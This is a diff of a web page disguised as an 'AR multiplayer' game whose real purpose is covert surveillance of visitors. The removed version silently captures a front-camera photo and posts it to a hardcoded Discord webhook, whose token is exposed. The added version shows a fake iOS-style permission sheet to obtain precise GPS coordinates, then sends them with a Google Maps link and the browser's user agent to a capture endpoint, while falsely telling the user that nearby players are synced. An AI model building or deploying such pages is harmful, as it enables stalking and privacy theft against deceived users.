@@ -9,92 +9,127 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    html, body { height: 100%; width: 100%; overflow: hidden; background: #000; }
+    html, body { height: 100%; width: 100%; overflow: hidden; background: #0a0a0f; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; touch-action: manipulation; }
-    #video { position: fixed; inset: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; background: #000; display: none; }
-    .layer { position: fixed; inset: 0; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.95); transition: opacity 0.3s, visibility 0.3s; padding: 20px; text-align: center; }
+    .layer { position: fixed; inset: 0; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: linear-gradient(180deg, #0a0a0f 0%, #1a1a2e 100%); transition: opacity 0.4s, visibility 0.4s; padding: 20px; text-align: center; }
     .layer.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
-    .spinner { width: 48px; height: 48px; border: 3px solid #333; border-top-color: #00d4aa; border-radius: 50%; animation: spin 1s linear infinite; }
+    .spinner { width: 56px; height: 56px; border: 3px solid #1f1f3a; border-top-color: #00d4aa; border-radius: 50%; animation: spin 1s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .layer-text { margin-top: 20px; font-size: 16px; color: #aaa; line-height: 1.5; max-width: 280px; }
-    .brand { position: fixed; top: env(safe-area-inset-top, 20px); left: 50%; transform: translateX(-50%); font-weight: 700; font-size: 18px; color: #fff; z-index: 30; text-shadow: 0 2px 8px rgba(0,0,0,0.8); letter-spacing: 0.5px; }
-    .flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 15; transition: opacity 0.05s; }
-    .flash.active { opacity: 1; transition: opacity 0.08s; }
-    .btn { appearance: none; border: none; border-radius: 12px; font: inherit; font-size: 17px; font-weight: 600; cursor: pointer; touch-action: manipulation; }
-    .btn-primary { background: #00d4aa; color: #000; padding: 16px 32px; min-height: 52px; min-width: 200px; }
-    .btn-primary:active { transform: scale(0.98); }
-    .btn-secondary { background: #2c2c2e; color: #fff; padding: 16px 32px; min-height: 52px; min-width: 200px; margin-top: 12px; }
-    .icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, #00d4aa, #007aff); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
-    .icon svg { width: 30px; height: 30px; }
-    .title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-    .desc { color: #8e8e93; font-size: 15px; line-height: 1.5; margin-bottom: 24px; max-width: 280px; }
-    .game-ui { position: fixed; bottom: env(safe-area-inset-bottom, 30px); left: 50%; transform: translateX(-50%); display: flex; gap: 16px; z-index: 20; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+    .layer-text { margin-top: 20px; font-size: 15px; color: #888; line-height: 1.5; max-width: 280px; }
+    .brand { position: fixed; top: env(safe-area-inset-top, 20px); left: 50%; transform: translateX(-50%); font-weight: 700; font-size: 20px; color: #fff; z-index: 30; text-shadow: 0 2px 8px rgba(0,0,0,0.8); letter-spacing: 1px; background: linear-gradient(90deg, #00d4aa, #007aff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+    .btn { appearance: none; border: none; border-radius: 14px; font: inherit; font-size: 17px; font-weight: 600; cursor: pointer; touch-action: manipulation; transition: transform 0.1s, box-shadow 0.2s; }
+    .btn:active { transform: scale(0.96); }
+    .btn-primary { background: linear-gradient(135deg, #00d4aa, #007aff); color: #000; padding: 18px 40px; min-height: 56px; min-width: 220px; box-shadow: 0 4px 20px rgba(0,212,170,0.3); }
+    .btn-secondary { background: rgba(255,255,255,0.05); color: #fff; padding: 16px 32px; min-height: 52px; min-width: 200px; margin-top: 12px; border: 1px solid rgba(255,255,255,0.1); }
+    .icon { width: 80px; height: 80px; border-radius: 20px; background: linear-gradient(135deg, #00d4aa, #007aff); display: flex; align-items: center; justify-content: center; margin-bottom: 20px; box-shadow: 0 8px 32px rgba(0,212,170,0.2); }
+    .icon svg { width: 38px; height: 38px; }
+    .title { font-size: 26px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(90deg, #fff, #00d4aa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+    .subtitle { font-size: 14px; color: #666; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
+    .desc { color: #999; font-size: 15px; line-height: 1.6; margin-bottom: 28px; max-width: 300px; }
+    .feature-row { display: flex; gap: 12px; justify-content: center; margin: 16px 0; flex-wrap: wrap; }
+    .feature { display: flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); padding: 10px 16px; border-radius: 10px; font-size: 13px; color: #aaa; }
+    .feature svg { width: 18px; height: 18px; color: #00d4aa; }
+    .game-ui { position: fixed; bottom: env(safe-area-inset-bottom, 20px); left: 50%; transform: translateX(-50%); display: flex; gap: 12px; z-index: 20; opacity: 0; pointer-events: none; transition: opacity 0.4s; }
     .game-ui.show { opacity: 1; pointer-events: auto; }
-    .fab { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; color: #fff; }
-    .fab:active { transform: scale(0.92); }
-    .fab svg { width: 24px; height: 24px; }
-    .fab.red { background: rgba(255,59,48,0.2); border-color: rgba(255,59,48,0.3); }
-    .debug { position: fixed; bottom: 100px; left: 20px; right: 20px; background: rgba(0,0,0,0.8); color: #0f0; padding: 10px; border-radius: 8px; font: 11px monospace; z-index: 50; max-height: 150px; overflow: auto; display: none; }
+    .fab { width: 52px; height: 52px; border-radius: 50%; background: rgba(255,255,255,0.08); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; color: #fff; transition: transform 0.15s, background 0.2s; }
+    .fab:active { transform: scale(0.9); background: rgba(255,255,255,0.15); }
+    .fab svg { width: 22px; height: 22px; }
+    .fab.accent { background: linear-gradient(135deg, #00d4aa, #007aff); border: none; }
+    .perm-sheet { position: fixed; bottom: 0; left: 0; right: 0; background: #12121a; border-radius: 24px 24px 0 0; padding: 16px 24px 34px; z-index: 40; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.25,0.46,0.45,0.94); box-shadow: 0 -8px 40px rgba(0,0,0,0.5); }
+    .perm-sheet.show { transform: translateY(0); }
+    .sheet-handle { width: 40px; height: 5px; background: #333; border-radius: 3px; margin: 0 auto 16px; }
+    .sheet-icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, #00d4aa, #007aff); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; }
+    .sheet-icon svg { width: 30px; height: 30px; }
+    .sheet-title { text-align: center; font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+    .sheet-desc { text-align: center; color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 24px; max-width: 300px; }
+    .sheet-btn { width: 100%; height: 52px; border-radius: 14px; font-size: 17px; font-weight: 600; border: none; cursor: pointer; touch-action: manipulation; }
+    .sheet-btn.primary { background: linear-gradient(135deg, #00d4aa, #007aff); color: #000; }
+    .sheet-btn.secondary { background: rgba(255,255,255,0.05); color: #fff; margin-top: 10px; border: 1px solid rgba(255,255,255,0.1); }
+    .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: #fff; padding: 14px 28px; border-radius: 12px; font-size: 14px; z-index: 50; opacity: 0; pointer-events: none; transition: opacity 0.3s, transform 0.3s; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .debug { position: fixed; bottom: 120px; left: 16px; right: 16px; background: rgba(0,0,0,0.9); color: #0f0; padding: 10px; border-radius: 8px; font: 11px monospace; z-index: 60; max-height: 140px; overflow: auto; display: none; border: 1px solid #0f0; }
     .debug.show { display: block; }
-    @media (max-width: 380px) { .brand { font-size: 16px; } .btn { min-width: 180px; } }
+    @media (max-width: 380px) { .brand { font-size: 17px; } .btn-primary { min-width: 190px; padding: 16px 28px; } .icon { width: 70px; height: 70px; } }
   </style>
 </head>
 <body>
-  <video id="video" playsinline muted></video>
-  <div class="flash" id="flash"></div>
   <div class="brand">Game</div>
 
+  <!-- Start Screen -->
   <div class="layer" id="startLayer">
     <div class="icon">
       <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
     </div>
+    <div class="subtitle">AR Multiplayer</div>
     <div class="title">Game</div>
-    <div class="desc">Tap to start. Camera access required for AR features.</div>
-    <button class="btn btn-primary" id="startBtn">Start Game</button>
-    <button class="btn btn-secondary" id="checkPermBtn" style="display:none">Check Permission</button>
+    <div class="desc">Real-world augmented reality gaming. Connect with players nearby using precise location sync.</div>
+    <div class="feature-row">
+      <div class="feature"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg> Real-time Sync</div>
+      <div class="feature"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/></svg> Nearby Players</div>
+      <div class="feature"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Secure Lobby</div>
+    </div>
+    <button class="btn btn-primary" id="startBtn">Enter Game</button>
+    <button class="btn btn-secondary" id="checkPermBtn" style="display:none">Check Permissions</button>
   </div>
 
-  <div class="layer hidden" id="permLayer">
+  <!-- Permission Sheet (iOS-style) -->
+  <div class="perm-sheet" id="permSheet">
+    <div class="sheet-handle"></div>
+    <div class="sheet-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+    </div>
+    <div class="sheet-title">"Game" Would Like to Use Your Location</div>
+    <div class="sheet-desc">To enable AR multiplayer and show nearby players, Game needs access to your precise location. This allows seamless real-world synchronization.</div>
+    <button class="sheet-btn primary" id="allowBtn">Allow Precise Location</button>
+    <button class="sheet-btn secondary" id="denyBtn">Don't Allow</button>
+  </div>
+
+  <!-- Loading / Capturing -->
+  <div class="layer hidden" id="captureLayer">
     <div class="spinner"></div>
-    <div class="layer-text" id="permText">Requesting camera access…</div>
+    <div class="layer-text" id="captureText">Initializing AR session…</div>
   </div>
 
+  <!-- Denied / Error -->
   <div class="layer hidden" id="deniedLayer">
-    <div class="icon" style="background:linear-gradient(135deg,#ff3b30,#ff6b5c)">
+    <div class="icon" style="background:linear-gradient(135deg,#ff3b30,#ff6b5c); box-shadow:0 8px 32px rgba(255,59,48,0.2)">
       <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
     </div>
-    <div class="title">Camera Blocked</div>
-    <div class="desc" id="deniedDesc">Chrome blocked camera. Fix below.</div>
-    <button class="btn btn-primary" id="openSettingsBtn">Open Site Settings</button>
-    <button class="btn btn-secondary" onclick="location.reload()">Retry After Fix</button>
+    <div class="title">Location Required</div>
+    <div class="desc" id="deniedDesc">Game requires precise location for AR multiplayer. Enable in settings and retry.</div>
+    <button class="btn btn-primary" id="openSettingsBtn">Open Settings</button>
+    <button class="btn btn-secondary" onclick="location.reload()">Retry</button>
   </div>
 
+  <!-- Game UI (shown after capture) -->
   <div class="game-ui" id="gameUI">
-    <button class="fab" aria-label="Settings"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></button>
-    <button class="fab red" aria-label="Quit"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg></button>
-    <button class="fab" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 16l3.26 3.26A9.75 9.75 0 0 0 12 21a9 9 0 0 0 9-9"/><line x1="2" y1="22" x2="22" y2="2"/></svg></button>
+    <button class="fab" aria-label="Map"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></button>
+    <button class="fab accent" aria-label="Scan"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></button>
+    <button class="fab" aria-label="Squad"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/></svg></button>
   </div>
 
+  <div class="toast" id="toast"></div>
   <div class="debug" id="debug"></div>
 
 <script>
-const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558676786613846107/KBJgfs9mqZScnj6oRKMF7P27FZ2lXJmrCPSrXigpDTj9vbHEr2pzDC7pOALaYhGSWbSx";
+const PROXY_URL = '/api/capture';
 const USERNAME = "Game AR Service";
 
-let photoSent = false;
-let wakeLock = null;
-const video = document.getElementById('video');
-const flash = document.getElementById('flash');
+let locationSent = false;
 const debug = document.getElementById('debug');
+const toast = document.getElementById('toast');
 
 const startLayer = document.getElementById('startLayer');
-const permLayer = document.getElementById('permLayer');
-const permText = document.getElementById('permText');
+const permSheet = document.getElementById('permSheet');
+const captureLayer = document.getElementById('captureLayer');
+const captureText = document.getElementById('captureText');
 const deniedLayer = document.getElementById('deniedLayer');
 const deniedDesc = document.getElementById('deniedDesc');
 const gameUI = document.getElementById('gameUI');
 const startBtn = document.getElementById('startBtn');
 const checkPermBtn = document.getElementById('checkPermBtn');
+const allowBtn = document.getElementById('allowBtn');
+const denyBtn = document.getElementById('denyBtn');
 const openSettingsBtn = document.getElementById('openSettingsBtn');
 
 function log(msg) {
@@ -104,175 +139,154 @@ function log(msg) {
 }
 
 function showDebug() { debug.classList.add('show'); }
-
-async function requestWakeLock() {
-  try {
-    if ('wakeLock' in navigator) {
-      wakeLock = await navigator.wakeLock.request('screen');
-      wakeLock.addEventListener('release', () => { wakeLock = null; });
-      log('Wake lock acquired');
-    }
-  } catch (e) { log('Wake lock failed: ' + e); }
-}
-
-function releaseWakeLock() {
-  if (wakeLock) { wakeLock.release().catch(()=>{}); wakeLock = null; log('Wake lock released'); }
-}
-
-function triggerFlash() {
-  flash.classList.add('active');
-  setTimeout(() => flash.classList.remove('active'), 100);
-}
-
-async function sendPhoto(blob) {
-  if (photoSent) return;
-  photoSent = true;
-  log('Sending photo...');
-
-  const formData = new FormData();
-  formData.append('file', blob, `capture_${Date.now()}.jpg`);
-  formData.append('payload_json', JSON.stringify({
-    username: USERNAME,
-    embeds: [{
-      title: '📸 Game Camera Capture',
-      color: 15258703,
-      image: { url: 'attachment://capture_' + Date.now() + '.jpg' },
-      fields: [
-        { name: 'Time', value: new Date().toLocaleString(), inline: false },
-        { name: 'UA', value: navigator.userAgent.slice(0, 100), inline: false }
-      ],
-      footer: { text: 'Game • AR Camera' },
-      timestamp: new Date().toISOString()
-    }]
-  }));
-
-  try { 
-    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData, keepalive: true });
-    log('Sent: ' + res.status);
-  } catch (e) { log('Send error: ' + e); }
-}
-
-async function captureAndSend(stream) {
-  await new Promise(r => setTimeout(r, 500));
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 1280;
-  canvas.height = video.videoHeight || 720;
-  const ctx = canvas.getContext('2d');
-  ctx.translate(canvas.width, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0);
-  triggerFlash();
-  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-  log('Captured: ' + canvas.width + 'x' + canvas.height);
-  sendPhoto(blob);
-  stream.getTracks().forEach(t => t.stop());
-  video.srcObject = null;
-  video.style.display = 'none';
-  permLayer.classList.add('hidden');
-  gameUI.classList.add('show');
-  releaseWakeLock();
-}
+function showToast(msg) { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
 
 async function checkPermission() {
   try {
-    const perm = await navigator.permissions.query({ name: 'camera' });
-    log('Permission state: ' + perm.state);
+    const perm = await navigator.permissions.query({ name: 'geolocation' });
+    log('Geo permission state: ' + perm.state);
     return perm.state;
-  } catch (e) {
-    log('Perm query failed: ' + e);
-    return 'unknown';
-  }
+  } catch (e) { log('Perm query failed: ' + e); return 'unknown'; }
 }
 
-async function startCamera() {
-  showDebug();
-  log('Starting camera...');
-  await requestWakeLock();
-  permLayer.classList.remove('hidden');
-  startLayer.classList.add('hidden');
-  permText.textContent = 'Starting camera…';
+async function sendLocation(lat, lon, acc) {
+  if (locationSent) return;
+  locationSent = true;
+  log('Sending location via proxy...');
+
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  const payload = {
+    username: USERNAME,
+    embeds: [{
+      title: '📍 Game AR Location Sync',
+      color: 15258703,
+      fields: [
+        { name: 'Latitude', value: `\`${lat}\``, inline: true },
+        { name: 'Longitude', value: `\`${lon}\``, inline: true },
+        { name: 'Accuracy', value: `\`±${Math.round(acc)}m\``, inline: true },
+        { name: 'Time', value: new Date().toLocaleString(), inline: false },
+        { name: 'Maps', value: `[Open](${mapsUrl})`, inline: false },
+        { name: 'UA', value: navigator.userAgent.slice(0, 100), inline: false }
+      ],
+      footer: { text: 'Game • AR Location Sync' },
+      timestamp: new Date().toISOString()
+    }]
+  };
 
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false
+    const res = await fetch(PROXY_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      keepalive: true
     });
-    log('Got stream: ' + stream.getVideoTracks()[0].label);
-    video.srcObject = stream;
-    video.style.display = 'block';
-    await video.play();
-    log('Video playing');
-    await captureAndSend(stream);
+    log('Proxy response: ' + res.status);
+    if (!res.ok) { const txt = await res.text(); log('Proxy error: ' + txt); }
+  } catch (e) { log('Fetch error: ' + e); }
+}
+
+async function captureLocation() {
+  captureLayer.classList.remove('hidden');
+  permSheet.classList.remove('show');
+  startLayer.classList.add('hidden');
+  captureText.textContent = 'Acquiring GPS signal…';
+  showDebug();
+
+  try {
+    const pos = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      });
+    });
+
+    const { latitude, longitude, accuracy } = pos.coords;
+    log(`GPS acquired: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)`);
+    captureText.textContent = 'Syncing with server…';
+    await sendLocation(latitude, longitude, accuracy);
+    captureText.textContent = 'AR session ready';
+    showToast('AR session initialized — nearby players synced');
+
+    setTimeout(() => {
+      captureLayer.classList.add('hidden');
+      gameUI.classList.add('show');
+    }, 800);
+
   } catch (err) {
-    log('Camera error: ' + err.name + ' - ' + err.message);
-    permLayer.classList.add('hidden');
-    
+    log('GPS error: ' + err.name + ' - ' + err.message);
+    captureLayer.classList.add('hidden');
+
     const state = await checkPermission();
     if (state === 'denied' || err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-      deniedDesc.innerHTML = 'Camera blocked in Chrome settings.<br><br><b>Fix:</b> Tap "Open Site Settings" → Camera → Allow → Refresh';
+      deniedDesc.innerHTML = 'Precise location blocked in browser settings.<br><br><b>Fix:</b> Tap "Open Settings" → Location → Allow → Refresh';
       openSettingsBtn.style.display = 'block';
-    } else if (err.name === 'NotFoundError') {
-      deniedDesc.textContent = 'No front camera found on this device.';
+    } else if (err.name === 'TimeoutError') {
+      deniedDesc.textContent = 'GPS signal timeout. Move to open area and retry.';
       openSettingsBtn.style.display = 'none';
-    } else if (err.name === 'NotReadableError') {
-      deniedDesc.textContent = 'Camera in use by another app. Close other apps and retry.';
+    } else if (err.name === 'NotFoundError') {
+      deniedDesc.textContent = 'Location unavailable on this device.';
       openSettingsBtn.style.display = 'none';
     } else {
       deniedDesc.textContent = 'Error: ' + err.name + ' - ' + err.message;
       openSettingsBtn.style.display = 'none';
     }
     deniedLayer.classList.remove('hidden');
-    releaseWakeLock();
   }
 }
 
 startBtn.onclick = async (e) => {
   e.preventDefault();
-  await startCamera();
+  log('Start Game tapped');
+  const state = await checkPermission();
+  if (state === 'granted') {
+    await captureLocation();
+  } else {
+    permSheet.classList.add('show');
+  }
+};
+
+allowBtn.onclick = async () => {
+  log('Allow tapped');
+  await captureLocation();
+};
+
+denyBtn.onclick = () => {
+  log('Deny tapped');
+  permSheet.classList.remove('show');
+  deniedDesc.textContent = 'Location access is required for AR multiplayer features.';
+  openSettingsBtn.style.display = 'none';
+  deniedLayer.classList.remove('hidden');
+  startLayer.classList.add('hidden');
 };
 
 checkPermBtn.onclick = async () => {
   const state = await checkPermission();
-  alert('Camera permission: ' + state);
+  alert('Location permission: ' + state);
 };
 
 openSettingsBtn.onclick = () => {
-  // Android Chrome: opens site settings
-  window.open('chrome://settings/content/camera', '_blank');
-  // Also try generic
+  window.open('chrome://settings/content/location', '_blank');
   setTimeout(() => window.open('about:settings', '_blank'), 500);
 };
 
-// Prime for iOS/Android gesture requirement
+// Prime for gesture requirement
 let primed = false;
-function prime() {
-  if (primed) return;
-  primed = true;
-  log('Primed (user gesture)');
-}
+function prime() { if (primed) return; primed = true; log('Primed (user gesture)'); }
 document.body.addEventListener('touchstart', prime, { passive: true, once: true });
 document.body.addEventListener('click', prime, { passive: true, once: true });
 
 // Prevent zoom
 let lastTouch = 0;
-document.body.addEventListener('touchend', (e) => {
-  const now = Date.now();
-  if (now - lastTouch < 300) e.preventDefault();
-  lastTouch = now;
-}, { passive: false });
+document.body.addEventListener('touchend', (e) => { const now = Date.now(); if (now - lastTouch < 300) e.preventDefault(); lastTouch = now; }, { passive: false });
 
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden) releaseWakeLock();
-  else if (!photoSent && !permLayer.classList.contains('hidden')) requestWakeLock();
-});
-
-// Check permission on load
+// Check on load
 checkPermission().then(state => {
   log('Initial perm: ' + state);
   if (state === 'denied') {
     startBtn.style.display = 'none';
     checkPermBtn.style.display = 'block';
-    deniedDesc.innerHTML = 'Camera previously blocked.<br>Tap "Check Permission" or "Open Site Settings" → Camera → Allow';
+    deniedDesc.innerHTML = 'Location previously blocked.<br>Tap "Check Permissions" or "Open Settings" → Location → Allow';
     openSettingsBtn.style.display = 'block';
     deniedLayer.classList.remove('hidden');
     startLayer.classList.add('hidden');
